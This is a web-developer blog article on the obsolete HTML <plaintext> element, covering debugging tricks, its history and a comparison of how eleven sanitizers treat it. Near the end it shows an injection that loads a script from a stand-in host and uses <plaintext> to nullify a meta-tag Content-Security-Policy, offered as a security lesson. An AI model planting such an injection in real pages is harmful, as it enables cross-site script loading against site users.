---
title: "Using the Ancient Evils for Debugging"
author: "Manuel Strehl"
author_bio: |
  Manuel is a Germany-based web developer. Working in a small agency named <a
  href="https://kinetiqa.de">Kinetiqa</a> he is tasked with everything web that
  comes our way, from DB optimizations to accessibility testings. He is in this
  business for long enough to show young developers his scars from the 2nd
  Browser War. In his little spare time he works on
  <a href="https://codepoints.net">codepoints.net</a>.
date: 2025-12-02
author_links:
  - label: "Manuel’s Website"
    url: "https://manuel-strehl.de"
    link_label: "manuel-strehl.de"
  - label: "Manuel on Mastodon"
    url: "https://mastodon.social/@boldewyn"
    link_label: "@boldewyn@mastodon.social"
intro: "<p>There are unspeakable horrors in the depth of the HTML standard. We will take one of them today and unmystify it for our own use.</p>"
image: "advent25_2"
---

Deep down in the dark voids of HTML specs long gone sleeps a terrifying thing.
Imagine, if you will, a DOM node so mighty, that it can change the
`content-type` of parts of the document. An HTML element that makes the parser tremble
and withdraw, and that cannot be stopped even by its own end tag.

The wise people of the W3C try to keep the knowledge of this terror away from
the mere mortals’ eye to spare us the danger of its madness. They advise us
not to use the magic tag name that is the incantation for this ancient malice.

We will, of course, do exactly this today. We’ll take a deep look at the

```html
<plaintext>
```

element and what fun things to use it for.

## A Quick Warning

This being said, I’d like to point out one important thing: Do not use this
element in production. The HTML living standard is [quite clear about
this](https://html.spec.whatwg.org/multipage/obsolete.html#plaintext):

> Elements in the following list are entirely obsolete, and must not be used by
> authors: [...] `plaintext`

So, what does `<plaintext>` do that earned it its place on HTML’s
list of deprecated elements? In a nutshell, it ends the HTML parser and
instructs the browser to interpret _everything_ following as plain text.

## What Do We Use this Power For?

That is to be taken literally. Really everything, including any closing
`</plaintext>` or `</html>` will be printed as if a rogue, unclosed `<pre>`
would suddenly go haywire and slurp up the rest of the page. By the way, this
makes `<plaintext>` the only non-empty element that has no end tag at all.

On first sight that sounds like a really stupid superpower. On second sight, it
still does. We go into why that element came into HTML below. But today we can
use it for one specific use case: Debugging server-side code.

Of course, specific debuggers like XDebug for PHP or built-in error pages like
in Django take the heavy lifting here. And even the good ol’
`print "<script>console.log('here!')</script>"` is often helpful. Those tools
should be high up in your utility belt.

But imagine this: You are deep down in your code chasing some elusive bug that
only affects some part of the HTML output, and you want to see at a quick glance
on the rendered page, where this problem appears. The quickest way is to
put a quick `<plaintext>` close to the offending place, reload the page, and
presto! Just scan down to where the markup starts to show through.

This is especially useful to access formatted debugging output. A `var_dump()`
in PHP, for example. Or an `error.stack` stack trace in NodeJS. Slap a
`<plaintext>` in front of it before writing it to the HTML output, so that the
string is immediatelly readable:

```php
<?php
# TODO delme!
echo '<plaintext>'; var_dump($strange_variable);
```

![A screenshot of the HTMHell website where the lower part shows the site’s
markup instead of the rendered HTML and a PHP variable
output.](./debug_php.png)

## The History behind this Evil

How come this seemingly fringe feature ended up in all mainstream browsers?
It was indeed there from the very beginning of HTML as this [historic W3C
document](https://www.w3.org/History/19921103-hypertext/hypertext/WWW/MarkUp/Tags.html)
of 1992 proves:

> **Plaintext**
>
> This tag indicates that all following text is to be taken litterally [!], up
> to the end of the file. Plain text is designed to be represented in the same
> way as example XMP text, with fixed width character and significant line
> breaks. Format:
>
> ```
> <PLAINTEXT>
> ```
>
> This tag allows the rest of a file to be read efficiently without parsing.
> Its presence is an optimisation. There is no closing tag.

This also tells us the reason for its invention. Back at the time the high-end PC
that Tim Berners-Lee used to write the first web browser had a quarter of the
power of a hand-me-down 2009 smartphone. It was important to optimize wherever
you could. Given that the early WWW was meant as a place to share scientific
information, the use case of having a large blob of plain text as part of your
fancy new HTML page was relatively common.

The possibility to end the costly HTML parser and fall back to simply printing
the remainder of the file as plain text was a powerful tool. It isn’t so uncommon,
too. For example, the programming language Perl uses a [special
marker](https://perldoc.perl.org/perldata#Special-Literals) to tell the Perl
parser to stop processing the remainder of the file:

```pl
print 'this is Perl code';
__END__
cout << 'this isn’t anymore';
```

Of course, nowadays, in the face of multi-megabyte JS payloads, this
optimization has become completely unnecessary.

## How Safe Are We?

But the element still _is_ available in all browsers. So we need to keep at
least a passing knowledge of it at the back of our minds.

To give you an example how this feature could be mis-used, assume a comment
function on a blog, where the commenter was able to smuggle in the string
`<plaintext>`. Let’s take a look at where things can go south from here on.

We use the test string

```
<p><b>hello<plaintext>world!</plaintext></b></p>
```

to check how several sanitizer libraries react to it.

### There Goes the Sanity!

The results are in. We ran each sanitizer in its most minimal configuration
that produced any output. This is by design: Sanitizers are security products.
They should produce safe output by default.

---

The new [HTML Sanitizer
API](https://developer.mozilla.org/en-US/docs/Web/API/Document/parseHTMLUnsafe_static)
as implemented in Firefox:

The approach of this API is to get the nesting correct again somehow according
to the HTML5 parser spec. That is, close
the `<p>` and `<b>` tags, then re-open the `<b>` tag as the spec suggests. The
API does not deal with the special semantics of `<plaintext>` at all, though.

The result is a mangled version of the original, which will have double-encoded
content in the still retained `<plaintext>` element.

```
<p><b>hello</b></p><plaintext><b>world!&lt;/plaintext&gt;&lt;/b&gt;&lt;/p&gt;</b></plaintext>
```

---

Poor man’s DOM sanitizing:

For this test we set the test string via `HTMLElement.innerHTML = test_string`
and read it again via `.innerHTML`. Chrome and Firefox show the same result.

The result is the same as for the Sanitizer API.

```
<p><b>hello</b></p><plaintext><b>world!&lt;/plaintext&gt;&lt;/b&gt;&lt;/p&gt;</b></plaintext>
```

---

[HTML Tidy](https://www.html-tidy.org/):

The venerable Tidy replaces the `<plaintext>` with a `<pre>`. This is creative.

```
<p><b>hello</b></p>
<pre><b>world!</b></pre>
```

---

[xss](https://jsxss.com/):

A well-known JavaScript-based sanitizer with special focus on XSS prevention
escapes only the `<plaintext>` tags and leaves everything else in place.

```
<p><b>hello&lt;plaintext&gt;world!&lt;/plaintext&gt;</b></p>
```

---

[DOMPurify](https://github.com/cure53/DOMPurify):

The classic JS sanitizer chooses to remove the `<plaintext>` and all its
“content”. DOMPurify sees to it, that the elements are properly closed.

```
<p><b>hello</b></p>
```

---

[HTML Purifier](http://htmlpurifier.org/): 

The top dog in the PHP world takes a slightly different approach. It removes
only the element itself. (Note the “world!” remaining intact.)

```
<p><b>helloworld!</b></p>
```

---

[Symfony HtmlSanitizer](https://symfony.com/html-sanitizer):

In the world of Symfony it seems to be considered a good idea to simply move
tags around. Interesting, but at least we’ve got all elements properly closed,
including the un-closeable `plaintext`.

```
<p><b>hello</b></p><plaintext>world!</plaintext>
```

---

[xmllint](https://gnome.pages.gitlab.gnome.org/libxml2/xmllint.html):

This libxml-based tool produces a warning about an “invalid tag plaintext”, but
keeps the markup completely unchanged:

```
<p><b>hello<plaintext>world!</plaintext></b></p>
```

---

[Mozilla Bleach](https://github.com/mozilla/bleach):

Python developers who reach for this library will have everything but the `<b>`
escaped.

```
&lt;p&gt;<b>hello&lt;plaintext&gt;world!&lt;/plaintext&gt;</b>&lt;/p&gt;
```

---

[OWASP Java HTML Sanitizer](https://github.com/OWASP/java-html-sanitizer/):

The staple HTML sanitizer in the Java world escapes everything and does strange
things to the end tags, but at least the `<plaintext>` is gone.

```
<b>helloworld!&lt;/plaintext&gt;&lt;/b&gt;&lt;/p&gt;</b>
```

---

[Ammonia](https://github.com/rust-ammonia/ammonia) as configured by [nh3](https://nh3.readthedocs.io/):

This Rust-based sanitizer advertises its speed and conformance with the HTML spec.

However, the result is close but still different to what browsers will do. In
this case, it’s the `<b>` tag that would not extend over the content of the
`<plaintext>` element.

```
<p><b>hello</b></p><b>world!&lt;/plaintext&gt;&lt;/b&gt;&lt;/p&gt;</b>
```

---

With 11 methods we produced 10 different outputs.

Just to be crystal clear here: this is not to shame some of these libraries.
Each one has a good reason to do what they do.

It emphasizes the point though, that one should be absolutely sure about the
purpose of a chosen sanitizer and extent that it will change its input. Is it for
removing potentially dangerous things, but keep as much HTML intact as possible?
Is it to scrape all HTML off the string, or only escaping any HTML-special
characters? The results will differ tremendously.

We enter the danger zone when mixing several tools together without taking
a cautious look first. For example,
look at how DOMPurify and HTML Purifier would interact in a potentially
hazardous way.
DOMPurify would remove any `<plaintext>` including its content. A later check
for any malicious payload would be negative.

HTML Purifier on the other hand just strips the `<plaintext>` tag, while
its content remains on the page. If we’d trust the previous DOMPurify result,
we’d be surprised by sudden new content being placed verbatim in the HTML code.

If one library is used for input validation and another one for output quoting,
this is a [cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
desaster waiting to happen, unless we know _exactly_ what we’re doing.

## Letting the Evil Sleep Again

In the case of `<plaintext>` itself we are most likely in a safe place,
though. Since `<plaintext>` has built-in HTML escaping, doing something dangerous
with it is severely limited. It would take considerable constellations of
errors to co-appear, to run malicious code.

Well, for the sake of the argument, let’s create such a case. Assume that you
embed a Content-Security Policy [in a `<meta>`
element](https://w3c.github.io/webappsec-csp/#meta-element) on your site
instead of an HTTP header:

```
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

This prevents loading 3rd party scripts sufficiently. If an attacker finds a
possibility to load HTML prior to this element, they can nullify the CSP:

```
<script src="https://example.com/malicious.js"></script>
<plaintext>
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

But again, for this to really have any effect, several things must come together:

- the attacker must be able to place HTML in the `<head>` (because CSP meta tags
    can only be used there)
- the CSP is not set via HTTP
- the complete remaining page is converted to `text/plain`, which makes this
    definitively not a stealthy attack

So we can conclude: It is important to know about `<plaintext>`. But if we
follow tried and tested security rules, we will remain safe from this ancient
evil.
